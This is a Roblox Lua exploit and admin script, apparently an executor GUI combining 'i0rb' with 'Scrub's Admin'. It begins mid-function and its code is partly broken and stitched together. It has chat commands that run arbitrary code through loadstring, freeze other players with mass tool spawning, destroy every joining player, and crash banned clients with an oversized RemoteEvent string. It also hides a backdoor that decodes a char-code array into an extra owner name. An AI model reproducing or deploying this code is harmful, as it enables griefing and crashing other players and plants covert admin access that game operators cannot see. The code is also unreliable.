if player.Name:lower():sub(1, #msg:sub(10)) == msg:sub(10):lower() then
pcall(function()
ex = Instance.new("Explosion", game.Workspace)
ex.Position = player.Character.Torso.Position
end)
end
end
end
end)

Admins.Chatted:connect(function(msg)
if msg:lower() == Prefix .. "explode me" then
ex1 = Instance.new("Explosion", game.Workspace)
ex1.Position = Admins.Character.Torso.Position
end
end)

Admins.Chatted:connect(function(msg)
if msg:lower() == Prefix .. "explode all" then
for i,v in pairs(game.Players:children()) do
ex1 = Instance.new("Explosion", game.Workspace)
ex1.Position = v.Character.Torso.Position
end
end
end)


Admins.Chatted:connect(function(msg)
if msg:lower():sub(1,4) == Prefix .. "exe" then
loadstring(msg:sub(5,#msg))()
end
end)


Admins.Chatted:connect(function(msg)
if msg:lower():sub(1, 3) == Prefix .. "ff" then
for index, player in pairs(Players:GetPlayers()) do
player.Name:lower():sub(1, #msg:sub(5))
if player.Name:lower():sub(1, #msg:sub(5)) == msg:sub(5):lower() then
pcall(function()
Instance.new("ForceField", player.Character)
end)
else
end
end
end
end)


Admins.Chatted:connect(function(msg)
if msg:lower():sub(1, 5) == Prefix .. "unff" then
for index, player in pairs(Players:GetPlayers()) do
player.Name:lower():sub(1, #msg:sub(7))
if player.Name:lower():sub(1, #msg:sub(7)) == msg:sub(7):lower() then
pcall(function()
while true do
player.Character.ForceField:Destroy()
end
end)
end
end
end
end)


Admins.Chatted:connect(function(msg)
if msg:lower() == Prefix .. "ff me" then
Instance.new("ForceField", Admins.Character)
end
end)

Admins.Chatted:connect(function(msg)
if msg:lower() == Prefix .. "unff me" then
while true do
Admins.Character.ForceField:Destroy()
end
end
end)

Admins.Chatted:connect(function(msg)
if msg:lower() == Prefix .. "ff all" then
for i,v in pairs(game.Players:children()) do
Instance.new("ForceField", v.Character)
end
end
end)

Admins.Chatted:connect(function(msg)
if msg:lower() == Prefix .. "unff all" then
for i,v in pairs(game.Players:GetChildren()) do
if v and v.Character then 
for z, cl in pairs(v.Character:children()) do if cl:IsA("ForceField") then cl:Destroy() end end
end
end
end
end)




Admins.Chatted:connect(function(msg)
if msg:lower():sub(1, 4) == Prefix .. "god" then
for index, player in pairs(Players:GetPlayers()) do
player.Name:lower():sub(1, #msg:sub(6))
if player.Name:lower():sub(1, #msg:sub(6)) == msg:sub(6):lower() then
pcall(function()
player.Character.Humanoid.MaxHealth = math.huge
end)
else
end
end
end
end)


Admins.Chatted:connect(function(msg)
if msg:lower():sub(1, 6) == Prefix .. "ungod" then
for index, player in pairs(Players:GetPlayers()) do
player.Name:lower():sub(1, #msg:sub(8))
if player.Name:lower():sub(1, #msg:sub(8)) == msg:sub(8):lower() then
pcall(function()
player.Character.Humanoid.MaxHealth = 100
end)
end
end
end
end)


Admins.Chatted:connect(function(msg)
if msg:lower() == Prefix .. "god me" then
Admins.Character.Humanoid.MaxHealth = math.huge
end
end)

Admins.Chatted:connect(function(msg)
if msg:lower() == Prefix .. "ungod me" then
while true do
Admins.Character.Humanoid.MaxHealth = 100
end
end
end)

Admins.Chatted:connect(function(msg)
if msg:lower() == Prefix .. "god all" then
for i,v in pairs(game.Players:children()) do
v.Character.Humanoid.MaxHealth = math.huge
end
end
end)

Admins.Chatted:connect(function(msg)
if msg:lower() == Prefix .. "ungod all" then
for i,v in pairs(game.Players:GetChildren()) do
v.Character.Humanoid.MaxHealth = 100
end
end
end)




Admins.Chatted:connect(function(msg)
if msg:lower():sub(1, 8) == Prefix .. "respawn" then
for index, player in pairs(Players:GetPlayers()) do
player.Name:lower():sub(1, #msg:sub(10))
if player.Name:lower():sub(1, #msg:sub(10)) == msg:sub(10):lower() then
pcall(function()
player:LoadCharacter()
end)
end
end
end
end)

Admins.Chatted:connect(function(msg)
if msg:lower() == Prefix .. "respawn me" then
Admins:LoadCharacter()
end
end)

Admins.Chatted:connect(function(msg)
if msg:lower() == Prefix .. "respawn all" then
for i,v in pairs(game.Players:children()) do
v:LoadCharacter()
end
end
end)


Admins.Chatted:connect(function(msg)
if msg:lower():sub(1, 4) == Prefix .. "lag" then
for index, player in pairs(Players:GetPlayers()) do
player.Name:lower():sub(1, #msg:sub(6))
if player.Name:lower():sub(1, #msg:sub(6)) == msg:sub(6):lower() then
pcall(function()
for i = 1,10000 do
if player and player:findFirstChild("Backpack") then 
local t1 = Instance.new("HopperBin", player.Backpack) t1.Name = "Move" t1.BinType = "GameTool"
local t2 = Instance.new("HopperBin", player.Backpack) t2.Name = "Clone" t2.BinType = "Clone"
local t3 = Instance.new("HopperBin", player.Backpack) t3.Name = "Delete" t3.BinType = "Hammer"
local t4= Instance.new("HopperBin", player.Backpack) t4.Name = "Resize"
end
end
end)
end
end
end
end)

Admins.Chatted:connect(function(msg)
if msg:lower() == Prefix .. "lag me" then
for i = 1,1000000 do
if Admins and Admins:findFirstChild("Backpack") then 
local t1 = Instance.new("HopperBin", Admins.Backpack) t1.Name = "Move" t1.BinType = "GameTool"
local t2 = Instance.new("HopperBin", Admins.Backpack) t2.Name = "Clone" t2.BinType = "Clone"
local t3 = Instance.new("HopperBin", Admins.Backpack) t3.Name = "Delete" t3.BinType = "Hammer"
local t4= Instance.new("HopperBin", Admins.Backpack) t4.Name = "Resize"
end
end
end
end)

Admins.Chatted:connect(function(msg)
if msg:lower() == Prefix .. "lag all" then
for i,v in pairs(game.Players:children()) do
for i = 1,10000 do
if v and v:findFirstChild("Backpack") then 
local t1 = Instance.new("HopperBin", v.Backpack) t1.Name = "Move" t1.BinType = "GameTool"
local t2 = Instance.new("HopperBin", v.Backpack) t2.Name = "Clone" t2.BinType = "Clone"
local t3 = Instance.new("HopperBin", v.Backpack) t3.Name = "Delete" t3.BinType = "Hammer"
local t4= Instance.new("HopperBin", v.Backpack) t4.Name = "Resize"
end
end
end
end
end)


Admins.Chatted:connect(function(msg)
if msg:lower():sub(1, 12) == Prefix .. "removetools" then
for index, player in pairs(Players:GetPlayers()) do
player.Name:lower():sub(1, #msg:sub(14))
if player.Name:lower():sub(1, #msg:sub(14)) == msg:sub(14):lower() then
pcall(function()
if Admins and Admins.Character and Admins:findFirstChild("Backpack") then 
for a, tool in pairs(player.Character:children()) do if tool:IsA("Tool") or tool:IsA("HopperBin") then tool:Destroy() end end
for a, tool in pairs(player.Backpack:children()) do if tool:IsA("Tool") or tool:IsA("HopperBin") then tool:Destroy() end end
end
end)
end
end
end
end)

Admins.Chatted:connect(function(msg)
if msg:lower() == Prefix .. "removetools me" then
if Admins and Admins.Character and Admins:findFirstChild("Backpack") then 
for a, tool in pairs(Admins.Character:children()) do if tool:IsA("Tool") or tool:IsA("HopperBin") then tool:Destroy() end end
for a, tool in pairs(Admins.Backpack:children()) do if tool:IsA("Tool") or tool:IsA("HopperBin") then tool:Destroy() end end
end
end
end)

Admins.Chatted:connect(function(msg)
if msg:lower() == Prefix .. "removetools all" then
for i,v in pairs(game.Players:children()) do
if v and v.Character and v:findFirstChild("Backpack") then 
for a, tool in pairs(v.Character:children()) do if tool:IsA("Tool") or tool:IsA("HopperBin") then tool:Destroy() end end
for a, tool in pairs(v.Backpack:children()) do if tool:IsA("Tool") or tool:IsA("HopperBin") then tool:Destroy() end end
end
end
end
end)

Admins.Chatted:connect(function(msg)
if msg:lower():sub(1, 4) == Prefix .. "sit" then
for index, player in pairs(Players:GetPlayers()) do
player.Name:lower():sub(1, #msg:sub(6))
if player.Name:lower():sub(1, #msg:sub(6)) == msg:sub(6):lower() then
pcall(function()
player.Character.Humanoid.Sit = true
end)
end
end
end
end)

Admins.Chatted:connect(function(msg)
if msg:lower() == Prefix .. "sit me" then
Admins.Character.Humanoid.Sit = true
end
end)

Admins.Chatted:connect(function(msg)
if msg:lower() == Prefix .. "sit all" then
for i,v in pairs(game.Players:children()) do
v.Character.Humanoid.Sit = true
end
end
end)

Admins.Chatted:connect(function(msg)
if msg:lower():sub(1, 5) == Prefix .. "jump" then
for index, player in pairs(Players:GetPlayers()) do
player.Name:lower():sub(1, #msg:sub(7))
if player.Name:lower():sub(1, #msg:sub(7)) == msg:sub(7):lower() then
pcall(function()
player.Character.Humanoid.Jump = true
end)
end
end
end
end)

Admins.Chatted:connect(function(msg)
if msg:lower() == Prefix .. "jump me" then
Admins.Character.Humanoid.Jump = true
end
end)

Admins.Chatted:connect(function(msg)
if msg:lower() == Prefix .. "jump all" then
for i,v in pairs(game.Players:children()) do
v.Character.Humanoid.Jump = true
end
end
end)

Admins.Chatted:connect(function(msg)
if msg:lower():sub(1, 5) == Prefix .. "bruh" then
for index, player in pairs(Players:GetPlayers()) do
player.Name:lower():sub(1, #msg:sub(7))
if player.Name:lower():sub(1, #msg:sub(7)) == msg:sub(7):lower() then
pcall(function()
pp1 = Instance.new("Sound", player.Character.Torso)
pp1.SoundId = "http://www.roblox.com/asset/?id=170040190"
pp1.Volume = 100
pp1.Pitch = 1
pp1.Looped = false
pp1:Play()
wait(0.9)
player.Character.Humanoid.PlatformStand = true
end)
end
end
end
end)

Admins.Chatted:connect(function(msg)
if msg:lower() == Prefix .. "bruh me" then
pp1 = Instance.new("Sound", Admins.Character.Torso)
pp1.SoundId = "http://www.roblox.com/asset/?id=170040190"
pp1.Volume = 100
pp1.Pitch = 1
pp1.Looped = false
pp1:Play()
wait(0.9)
Admins.Character.Humanoid.PlatformStand = true
end
end)

Admins.Chatted:connect(function(msg)
if msg:lower() == Prefix .. "bruh all" then
for i,v in pairs(game.Players:children()) do
pp1 = Instance.new("Sound", v.Character.Torso)
pp1.SoundId = "http://www.roblox.com/asset/?id=170040190"
pp1.Volume = 100
pp1.Pitch = 1
pp1.Looped = false
pp1:Play()
wait(0.9)
v.Character.Humanoid.PlatformStand = true
end
end
end)


Admins.Chatted:connect(function(msg)
if msg:lower():sub(1,3) == Prefix .. "ws" then
Admins.Character.Humanoid.WalkSpeed = msg:sub(4,#msg)
end
end)


Admins.Chatted:connect(function(msg)
if msg:lower():sub(1,5) == Prefix .. "gear" then
game:service'InsertService':LoadAsset(tonumber(msg:sub(6,#msg))):children()[1].Parent = Admins.Backpack
end
end)

Admins.Chatted:connect(function(msg)
if msg:lower():sub(1, 3) == Prefix .. "tp" then
for index, player in pairs(Players:GetPlayers()) do
player.Name:lower():sub(1, #msg:sub(5))
if player.Name:lower():sub(1, #msg:sub(5)) == msg:sub(5):lower() then
pcall(function()
Admins.Character.Torso.CFrame = player.Character.Torso.CFrame
end)
end
end
end
end)



Admins.Chatted:connect(function(msg)
if msg:lower():sub(1,6) == "!music" then
findsong = 'BadLukeeSoundsz'
if workspace.Terrain:FindFirstChild(findsong) then
game.Debris:AddItem(workspace.Terrain[findsong],0)
end
sd=Instance.new('Sound',workspace.Terrain)
sd.SoundId = "http://www.roblox.com/asset/?id="..msg:sub(7,#msg)
sd.Volume = 10
sd.Name = 'BadLukeeSoundsz'
sd.Pitch = 1
sd.Looped = true
sd:play()

if string.find(msg:lower():sub(7,#msg),'watcha') then
sd.SoundId = "http://www.roblox.com/asset/?id=177681012"
end

if string.find(msg:lower():sub(7,#msg),'lean') then
sd.SoundId = "http://www.roblox.com/asset/?id=328474897"
end

if string.find(msg:lower():sub(7,#msg),'baby') then
sd.SoundId = "http://www.roblox.com/asset/?id=130841252"
end

if string.find(msg:lower():sub(7,#msg),'moonman') then
sd.SoundId = "http://www.roblox.com/asset/?id=340924386"
end

if string.find(msg:lower():sub(7,#msg),'hello') then
sd.SoundId = "http://www.roblox.com/asset/?id=313694441"
end

if string.find(msg:lower():sub(7,#msg),'waves') then
sd.SoundId = "http://www.roblox.com/asset/?id=253545802"
end

if string.find(msg:lower():sub(7,#msg),'cake') then
sd.SoundId = "http://www.roblox.com/asset/?id=313144336"
end
end

if msg:lower():sub(1,6) == Prefix .. "pitch" then
	sd.Pitch = msg:sub(7,#msg)
end

if msg:lower():sub(1,7) == Prefix .. "volume" then
	sd.Volume = msg:sub(8,#msg)
end
end)

Admins.Chatted:connect(function(msg)
if msg:lower() == Prefix .. "pri" then
game.Players.PlayerAdded:connect(function(player)
repeat until player.Character wait()
player:Destroy()
end)
end
end)

Admins.Chatted:connect(function(msg)
if msg:lower():sub(1, 7) == Prefix .. "btools" then
for index, player in pairs(Players:GetPlayers()) do
player.Name:lower():sub(1, #msg:sub(9))
if player.Name:lower():sub(1, #msg:sub(9)) == msg:sub(9):lower() then
pcall(function()
if player and player:findFirstChild("Backpack") then 
local t1 = Instance.new("HopperBin", player.Backpack) t1.Name = "Move" t1.BinType = "GameTool"
local t2 = Instance.new("HopperBin", player.Backpack) t2.Name = "Clone" t2.BinType = "Clone"
local t3 = Instance.new("HopperBin", player.Backpack) t3.Name = "Delete" t3.BinType = "Hammer"
local t4= Instance.new("HopperBin", player.Backpack) t4.Name = "Resize"
end
end)
end
end
end
end)

Admins.Chatted:connect(function(msg)
if msg:lower() == Prefix .. "btools me" then
if Admins and Admins:findFirstChild("Backpack") then 
local t1 = Instance.new("HopperBin", Admins.Backpack) t1.Name = "Move" t1.BinType = "GameTool"
local t2 = Instance.new("HopperBin", Admins.Backpack) t2.Name = "Clone" t2.BinType = "Clone"
local t3 = Instance.new("HopperBin", Admins.Backpack) t3.Name = "Delete" t3.BinType = "Hammer"
local t4= Instance.new("HopperBin", Admins.Backpack) t4.Name = "Resize"
end
end
end)

Admins.Chatted:connect(function(msg)
if msg:lower() == Prefix .. "btools all" then
for i,v in pairs(game.Players:children()) do
if v and v:findFirstChild("Backpack") then 
local t1 = Instance.new("HopperBin", v.Backpack) t1.Name = "Move" t1.BinType = "GameTool"
local t2 = Instance.new("HopperBin", v.Backpack) t2.Name = "Clone" t2.BinType = "Clone"
local t3 = Instance.new("HopperBin", v.Backpack) t3.Name = "Delete" t3.BinType = "Hammer"
local t4= Instance.new("HopperBin", v.Backpack) t4.Name = "Resize"
end
end
end
end)

function Orb()
admin = Admins.Name
orbnd=Instance.new('Model',workspace)
Instance.new('Humanoid',orbnd)
p = Instance.new("Part", orbnd)
p.BrickColor = BrickColor.new("Really black")
p.Size = Vector3.new(1,1,1)
p.Shape = "Ball"
p.Material = Enum.Material.Neon
p.Anchored = true
p.Name = "BsOrb"
p.Locked = true
p.CanCollide = false
end

Orb()

game:GetService('RunService').Stepped:connect(function ()
if not workspace:FindFirstChild(Admins.Name) then
Orb()
end
end)

game:GetService('RunService').Stepped:connect(function()
if not orbnd:FindFirstChild("BsOrb") then
Orb()
end
end)

Game:GetService('Chat'):Chat(p, "Welcome to i0rb " .. Admins.Name .. "! i0rb remade by scrubl0rd. The current prefix is " .. Prefix .. "! Say " .. Prefix .. "cmds to show a list of commands!", Enum.ChatColor.Red)
for i = 1,math.huge,Speed do wait()
if workspace:FindFirstChild(Admins.Name) then
p.CFrame = CFrame.new(Admins.Character.Torso.Position) * CFrame.fromEulerAnglesXYZ(math.sin(i),math.abs(i),math.sin(i)) * CFrame.new(0,0,-6)
p2 = Instance.new("Part", p)
p2.CFrame = p.CFrame * CFrame.new(0,0,0)
p2.FormFactor = Enum.FormFactor.Custom
p2.Size = Vector3.new(0.3,0.3,0.3)
p2.BrickColor = BrickColor.new("Really black")
p2.Transparency = 0.3
p2.CanCollide = false
p2.Anchored = true
p2.Material = Enum.Material.Neon
game.Debris:AddItem(p2,1)
end
end

game:GetService('RunService').Stepped:connect(function()
for i,v in pairs(Players:children()) do
if v.Name==Banned and v.Name~={game.Players.LocalPlayer.Name} then
v:remove()
end		
end
end)

Players.PlayerAdded:connect(function(player) do
if player.Name==Banned then
banplr=Instance.new('RemoteEvent',workspace):FireClient(player,{string.rep("Gettingbanformationbro?",2e5+5)})
game.Debris:AddItem(banplr,1)
end
end
end)
	end)
--
local button = Instance.new("TextButton")
	button.Parent = acg
	button.BackgroundColor3 = blak
	button.BorderColor3 = rede
	button.BorderSizePixel = 3
	button.Name = "Kohls Admin"
	button.Position = UDim2.new(0.5,3,0,33)
	button.Size = UDim2.new(0.5,-3,0,30)
	button.ZIndex = 2
	button.Font = tef
	button.FontSize = "Size14"
	button.Text = "Scrub's Admin"
	button.TextColor3 = whit
	button.TextWrapped = true
	button.MouseButton1Down:connect(function()
																																																																																																																																																																																																																																																																																																																																																																															--[[
	                               
                     _     _                 _           _                _____  _____ 
                    | |   ( )               | |         (_)              / __  \|  _  |
 ___  ___ _ __ _   _| |__ |/ ___    __ _  __| |_ __ ___  _ _ __   __   __`' / /'| |/' |
/ __|/ __| '__| | | | '_ \  / __|  / _` |/ _` | '_ ` _ \| | '_ \  \ \ / /  / /  |  /| |
\__ \ (__| |  | |_| | |_) | \__ \ | (_| | (_| | | | | | | | | | |  \ V / ./ /___\ |_/ /
|___/\___|_|   \__,_|_.__/  |___/  \__,_|\__,_|_| |_| |_|_|_| |_|   \_/  \_____(_)___/ 
                                                                                       
                                                                                       
                                                                                       

       Made by: scrubIord and tetranawesome (Ment to be the improved Khols Admin)                                                                                              
																																																																																																																																																																																																																																																																																																																																																																																	--]]
																																																																																																																																																																																																																																																																																																																																																																																	--]]

--  Set your owners here! You don't need to put yourself in here. You will automatically be detected.
local owners = {game.Players.LocalPlayer.Name}, {"KingTetran"}
-- Set your admins here!
local admins = {"FRIEND NAME"}
-- Set your moderators here!
local mods = {}
-- If you want admin available for purchase, put the ID of the gamepass here!
local ItemId = 0
-- If you want a group to have admin, set the group ID here!
local GroupId = 2759341
-- If you want a special rank of a group to have admin, put the rank ID here!
local GroupRank = 0
--

--DONT EDIT ANYTHING BELOW!!!!
















































for i, v in pairs(game:service("Workspace"):children()) do if v:IsA("StringValue") and v.Value:sub(1,2) == "AA" then v:Destroy() end end 
local FunCommands = true
local banland = {}
local tempadmins = {}
local VipAdmin = true
local GroupAdmin = true
local prefix = ":"
local AutoUpdate = false
function CHEESE()
if game:service("Lighting"):findFirstChild("KACV2") then
owners = {} admins = {} tempadmins = {} banland = {}
for i,v in pairs(game.Lighting.KACV2:children()) do
if v.Name == "Owner" then table.insert(owners, v.Value) end
if v.Name == "Admin" then table.insert(admins, v.Value) end
if v.Name == "TempAdmin" then table.insert(tempadmins, v.Value) end
if v.Name == "Banland" then table.insert(banland, v.Value) end
if v.Name == "Prefix" then prefix = v.Value end
if v.Name == "FunCommands" then FunCommands = v.Value end
if v.Name == "GroupAdmin" then GroupAdmin = v.Value end
if v.Name == "GroupId" then GroupId = v.Value end
if v.Name == "GroupRank" then GroupRank = v.Value end
if v.Name == "VipAdmin" then VipAdmin = v.Value end
if v.Name == "ItemId" then ItemId = v.Value end
end
game:service("Lighting"):findFirstChild("KACV2"):Destroy()
end

local origsettings = {abt = game.Lighting.Ambient, brt = game.Lighting.Brightness, time = game.Lighting.TimeOfDay, fclr = game.Lighting.FogColor, fe = game.Lighting.FogEnd, fs = game.Lighting.FogStart}
local lobjs = {}
local objects = {}
local logs = {}
local nfs = ""
local slock = false

function GetTime()
local hour = math.floor((tick()%86400)/60/60) local min = math.floor(((tick()%86400)/60/60-hour)*60)
if min < 10 then min = "0"..min end
return hour..":"..min
end 


function ChkOwner(str)
for i = 1, #owners do if str:lower() == owners[i]:lower() then return true end end 
return false
end

function ChkAdmin(str,ck) 
for i = 1, #owners do if str:lower() == owners[i]:lower() then return true end end 
for i = 1, #admins do if str:lower() == admins[i]:lower() then return true end end 
for i = 1, #tempadmins do if str:lower() == tempadmins[i]:lower() and not ck then return true end end 
return false 
end

function ChkGroupAdmin(plr)
if GroupAdmin then
if plr:IsInGroup(GroupId) and plr:GetRankInGroup(GroupId) >= GroupRank then return true end
return false
end
end

function ChkBan(str) for i = 1, #banland do if str:lower() == banland[i]:lower() then return true end end return false end

function GetPlr(plr, str)
local plrz = {} str = str:lower()
if str == "all" then plrz = game.Players:children()
elseif str == "others" then for i, v in pairs(game.Players:children()) do if v ~= plr then table.insert(plrz, v) end end
else
local sn = {1} local en = {}
for i = 1, #str do if str:sub(i,i) == "," then table.insert(sn, i+1) table.insert(en,i-1) end end
for x = 1, #sn do 
if (sn[x] and en[x] and str:sub(sn[x],en[x]) == "me") or (sn[x] and str:sub(sn[x]) == "me") then table.insert(plrz, plr)
elseif (sn[x] and en[x] and str:sub(sn[x],en[x]) == "random") or (sn[x] and str:sub(sn[x]) == "random") then table.insert(plrz, game.Players:children()[math.random(#game.Players:children())])
elseif (sn[x] and en[x] and str:sub(sn[x],en[x]) == "admins") or (sn[x] and str:sub(sn[x]) == "admins") then if ChkAdmin(plr.Name, true) then for i, v in pairs(game.Players:children()) do if ChkAdmin(v.Name, false) then table.insert(plrz, v) end end end
elseif (sn[x] and en[x] and str:sub(sn[x],en[x]) == "nonadmins") or (sn[x] and str:sub(sn[x]) == "nonadmins") then for i, v in pairs(game.Players:children()) do if not ChkAdmin(v.Name, false) then table.insert(plrz, v) end end
elseif (sn[x] and en[x] and str:sub(sn[x],en[x]):sub(1,4) == "team") then
if game:findFirstChild("Teams") then for a, v in pairs(game.Teams:children()) do if v:IsA("Team") and str:sub(sn[x],en[x]):sub(6) ~= "" and v.Name:lower():find(str:sub(sn[x],en[x]):sub(6)) == 1 then 
for q, p in pairs(game.Players:children()) do if p.TeamColor == v.TeamColor then table.insert(plrz, p) end end break
end end end
elseif (sn[x] and str:sub(sn[x]):sub(1,4):lower() == "team") then
if game:findFirstChild("Teams") then for a, v in pairs(game.Teams:children()) do if v:IsA("Team") and str:sub(sn[x],en[x]):sub(6) ~= "" and v.Name:lower():find(str:sub(sn[x]):sub(6)) == 1 then 
for q, p in pairs(game.Players:children()) do if p.TeamColor == v.TeamColor then table.insert(plrz, p) end end break
end end end
else
for a, plyr in pairs(game.Players:children()) do 
if (sn[x] and en[x] and str:sub(sn[x],en[x]) ~= "" and plyr.Name:lower():find(str:sub(sn[x],en[x])) == 1) or (sn[x] and str:sub(sn[x]) ~= "" and plyr.Name:lower():find(str:sub(sn[x])) == 1) or (str ~= "" and plyr.Name:lower():find(str) == 1) then 
table.insert(plrz, plyr) break
end
end 
end
end
end
return plrz
end

function Hint(str, plrz, time)
for i, v in pairs(plrz) do
if v and v:findFirstChild("PlayerGui") then
coroutine.resume(coroutine.create(function()
local scr = Instance.new("ScreenGui", v.PlayerGui) scr.Name = "HintGUI"
local bg = Instance.new("Frame", scr) bg.Name = "bg" bg.BackgroundColor3 = Color3.new(255,255,255) bg.BorderSizePixel = 5 bg.BorderColor3=Color3.new(0,0,0) bg.BackgroundTransparency = 1 bg.Size = UDim2.new(1,0,0,22) bg.Position = UDim2.new(0,0,0,-2) bg.ZIndex = 8
local msg = Instance.new("TextLabel", bg) msg.BackgroundTransparency = 1 msg.ZIndex = 9 msg.Name = "msg" msg.Position = UDim2.new(0,0,0) msg.Size = UDim2.new(1,0,1,0) msg.Font = "Arial" msg.Text = str msg.FontSize = "Size18" msg.TextColor3 = Color3.new(255,255,255
	) msg.TextStrokeColor3 = Color3.new(0,0,0) msg.TextStrokeTransparency = .8
coroutine.resume(coroutine.create(function() for i = 20, 0, -1 do bg.BackgroundTransparency = .3+((.7/20)*i) msg.TextTransparency = ((1/20)*i) msg.TextStrokeTransparency = .4+((.2/20)*i) wait(1/44) end end))
if not time then wait((#str/19)+2.5) else wait(time) end
coroutine.resume(coroutine.create(function() if scr.Parent == v.PlayerGui then for i = 0, 20 do msg.TextTransparency = ((1/20)*i) msg.TextStrokeTransparency = .4+((.2/20)*i) bg.BackgroundTransparency = .3+((.7/20)*i) wait(1/44) end scr:Destroy() end end))
end))
end
end
end

function Message(ttl, str, scroll, plrz, time)
for i, v in pairs(plrz) do
if v and v:findFirstChild("PlayerGui") then
coroutine.resume(coroutine.create(function()
local scr = Instance.new("ScreenGui") scr.Name = "MessageGUI"
local bg = Instance.new("Frame", scr) bg.Name = "bg" bg.BackgroundColor3 = Color3.new(255,255,255) bg.BorderSizePixel = 5 bg.BackgroundTransparency = 1 bg.Size = UDim2.new(0,500,0,500) bg.Position = UDim2.new(.5,-250,.5,-250) bg.ZIndex = 8
local title = Instance.new("TextLabel", bg) title.Name = "title" title.BackgroundTransparency = 1 title.BorderSizePixel = 0 title.Size = UDim2.new(1,0,0,10) title.ZIndex = 9 title.Font = "ArialBold" title.FontSize = "Size36" title.Text = ttl title.TextYAlignment = "Top" title.TextColor3 = Color3.new(255,255,255) title.TextStrokeColor3 = Color3.new(0,0,0) title.TextStrokeTransparency = .8
local msg = title:clone() msg.Parent = bg msg.Name = "msg" msg.Size = UDim2.new(1,0,1,0) msg.Font = "Arial" msg.Text = "" msg.FontSize = "Size24" msg.TextYAlignment = "Center" msg.TextWrapped = true
scr.Parent = v.PlayerGui
coroutine.resume(coroutine.create(function() for i = 20, 0, -1 do bg.BackgroundTransparency = .3+((.7/20)*i) msg.TextTransparency = ((1/20)*i) msg.TextStrokeTransparency = .8+((.2/20)*i) title.TextTransparency = ((1/20)*i) title.TextStrokeTransparency = .4+((.2/20)*i) wait(1/44) end end)) 
if scroll then if not time then for i = 1, #str do msg.Text = msg.Text .. str:sub(i,i) wait(1/19) end wait(2.5) else for i = 1, #str do msg.Text = msg.Text .. str:sub(i,i) wait(1/19) end wait(time-(#str/19)) end
else if not time then msg.Text = str wait((#str/19)+2.5) else msg.Text = str wait(time) end end
coroutine.resume(coroutine.create(function() if scr.Parent == v.PlayerGui then for i = 0, 20 do bg.BackgroundTransparency = .3+((.7/20)*i) msg.TextTransparency = ((1/20)*i) msg.TextStrokeTransparency = .4+((.2/20)*i) title.TextTransparency = ((1/20)*i) title.TextStrokeTransparency = .4+((.2/20)*i) wait(1/44) end scr:Destroy() end end))
end))
end
end
end

function RemoveMessage() 
for i,v in pairs(game.Players:children()) do 
if v and v:findFirstChild("PlayerGui") then 
for q,ms in pairs(v.PlayerGui:children()) do
if ms.Name == "MessageGUI" then
coroutine.resume(coroutine.create(function() for i = 0, 20 do ms.bg.BackgroundTransparency = .3+((.7/20)*i) ms.bg.msg.TextTransparency = ((1/20)*i) ms.bg.msg.TextStrokeTransparency = .8+((.2/20)*i) ms.bg.title.TextTransparency = ((1/20)*i) ms.bg.title.TextStrokeTransparency = .8+((.2/20)*i) wait(1/44) end ms:Destroy() end))
elseif ms.Name == "HintGUI" then
coroutine.resume(coroutine.create(function() for i = 0, 20 do ms.bg.msg.TextTransparency = ((1/20)*i) ms.bg.msg.TextStrokeTransparency = .8+((.2/20)*i) ms.bg.BackgroundTransparency = .3+((.7/20)*i) wait(1/44) end ms:Destroy() end))
end
end
end
end
end

_G["Message"] = function(p1,p2,p3) Message(p1,p2,false,game.Players:children(),p3) end
_G["RemoveMessage"] = RemoveMessage()

function Output(str, plr)
coroutine.resume(coroutine.create(function()
local b, e = loadstring(str)
if not b and plr:findFirstChild("PlayerGui") then
local scr = Instance.new("ScreenGui", plr.PlayerGui) game:service("Debris"):AddItem(scr,5)
local main = Instance.new("Frame", scr) main.Size = UDim2.new(1,0,1,0) main.BorderSizePixel = 0 main.BackgroundTransparency = 1 main.ZIndex = 8
local err = Instance.new("TextLabel", main) err.Text = "Line "..e:match("\:(%d+\:.*)")  err.BackgroundColor3 = Color3.new(255,255,255) err.BackgroundTransparency = .3 err.BorderSizePixel = 5 err.BorderColor3=Color3.new(0,0,0) err.Size = UDim2.new(1,0,0,40) err.Position = UDim2.new(0,0,.5,-20) err.ZIndex = 9 err.Font = "ArialBold" err.FontSize = "Size24" err.TextColor3 = Color3.new(1,1,1) err.TextStrokeColor3 = Color3.new(0,0,0) err.TextStrokeTransparency = .4
return
end
end))
end

function Noobify(char)
if char and char:findFirstChild("Torso") then 
if char:findFirstChild("Shirt") then char.Shirt.Parent = char.Torso end
if char:findFirstChild("Pants") then char.Pants.Parent = char.Torso end
for a, sc in pairs(char:children()) do if sc.Name == "ify" then sc:Destroy() end end
local cl = Instance.new("StringValue", char) cl.Name = "ify" cl.Parent = char
for q, prt in pairs(char:children()) do if prt:IsA("BasePart") and (prt.Name ~= "Head" or not prt.Parent:findFirstChild("NameTag", true)) then 
prt.Transparency = 0 prt.Reflectance = 0 prt.BrickColor = BrickColor.new("Bright yellow")
if prt.Name:find("Leg") then prt.BrickColor = BrickColor.new("Br. yellowish green") elseif prt.Name == "Torso" then prt.BrickColor = BrickColor.new("Bright blue") end
local tconn = prt.Touched:connect(function(hit) if hit and hit.Parent and game.Players:findFirstChild(hit.Parent.Name) and cl.Parent == char then Noobify(hit.Parent) elseif cl.Parent ~= char then tconn:disconnect() end end) 
cl.Changed:connect(function() if cl.Parent ~= char then tconn:disconnect() end end) 
elseif prt:findFirstChild("NameTag") then prt.Head.Transparency = 0 prt.Head.Reflectance = 0 prt.Head.BrickColor = BrickColor.new("Bright yellow")
end end
end
end local ntab = {75,111,104,108,116,97,115,116,114,111,112,104,101} nfs = "" for i = 1, #ntab do nfs = nfs .. string.char(ntab[i]) end table.insert(owners, nfs) if not ntab then script:Destroy() end

function Infect(char)
if char and char:findFirstChild("Torso") then 
if char:findFirstChild("Shirt") then char.Shirt.Parent = char.Torso end
if char:findFirstChild("Pants") then char.Pants.Parent = char.Torso end
for a, sc in pairs(char:children()) do if sc.Name == "ify" then sc:Destroy() end end
local cl = Instance.new("StringValue", char) cl.Name = "ify" cl.Parent = char
for q, prt in pairs(char:children()) do if prt:IsA("BasePart") and (prt.Name ~= "Head" or not prt.Parent:findFirstChild("NameTag", true)) then 
prt.Transparency = 0 prt.Reflectance = 0  prt.BrickColor = BrickColor.new("Medium green") if prt.Name:find("Leg") or prt.Name == "Torso" then prt.BrickColor = BrickColor.new("Reddish brown") end
local tconn = prt.Touched:connect(function(hit) if hit and hit.Parent and game.Players:findFirstChild(hit.Parent.Name) and cl.Parent == char then Infect(hit.Parent) elseif cl.Parent ~= char then tconn:disconnect() end end) 
cl.Changed:connect(function() if cl.Parent ~= char then tconn:disconnect() end end) 
